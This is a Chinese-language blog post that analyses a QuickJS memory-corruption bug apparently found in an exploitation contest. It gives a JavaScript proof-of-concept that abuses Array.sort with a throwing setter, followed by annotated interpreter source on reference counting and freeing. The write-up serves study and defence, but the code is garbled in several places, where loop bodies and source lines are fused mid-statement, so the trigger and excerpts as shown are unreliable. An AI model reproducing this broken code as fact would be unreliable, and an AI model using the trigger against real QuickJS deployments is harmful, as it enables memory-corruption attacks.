从twitter上看到了一个关于quickjs漏洞挖掘与漏洞利用的一次竞赛:  
一共看到6个poc，3个代码审计、2个fuzzing、1个凭感觉..........，最后两个完成了exp，控制了eip/rip。  
我试着分析了其中一个漏洞，并记录了整个过程。
## 0x1 POC
    let spray = new Array(100);
    let a = [{hack:0},1,2,3,4];
    let refcopy = [a[0]];
    a.__defineSetter__(3,()=>{throw 1;});
    try {
        a.sort(function(v){if (v == a[0]) return 0; return 1;});
    }
    catch (e){}
    a[0] = 0;
    for (let i=0; iref_count++;
    580     }
释放内存
    1796     JS_FreeValue(ctx, old_val);
分配内存
    14590         CASE(OP_object):
    14591             *sp++ = JS_NewObject(ctx);
## 0x2 简单分析
有了上面的信息，我试着逐行运行poc文件，尝试去理解quickjs是怎么解析js语法的。
**let a = [1,2,3] //创建数组**
    14855         CASE(OP_array_from):
    14856             {
    14857                 int i, ret;
    14858 
    14859                 call_argc = get_u16(pc);
    14860                 pc += 2;
    14861                 ret_val = JS_NewArray(ctx);
    14862                 if (unlikely(JS_IsException(ret_val)))
    14863                     goto exception;
    14864                 call_argv = sp - call_argc;
    14865                 for(i = 0; i ref_count++;
    580     }
    581     return (JSValue)v;
    582 }
    //释放掉之前的 减1
    555 static inline void JS_FreeValue(JSContext *ctx, JSValue v)
    556 {
    557     if (JS_VALUE_HAS_REF_COUNT(v)) {
    558         JSRefCountHeader *p = JS_VALUE_GET_PTR(v);
    559         if (--p->ref_count {throw 1;}); //设置数组属性值的方法，箭头函数，抛出异常**
    14837         CASE(OP_tail_call_method):
    14838             {
    14839                 call_argc = get_u16(pc);
    14840                 pc += 2;
    14841                 call_argv = sp - call_argc;
    14842                 sf->cur_pc = pc;
    14843                 ret_val = JS_CallInternal(ctx, call_argv[-1], call_argv[-2],
    14844                                           JS_UNDEFINED, call_argc, call_argv, 0);
    14845                 if (unlikely(JS_IsException(ret_val)))
    14846                     goto exception;
    14847                 if (opcode == OP_tail_call_method)
    14848                     goto done;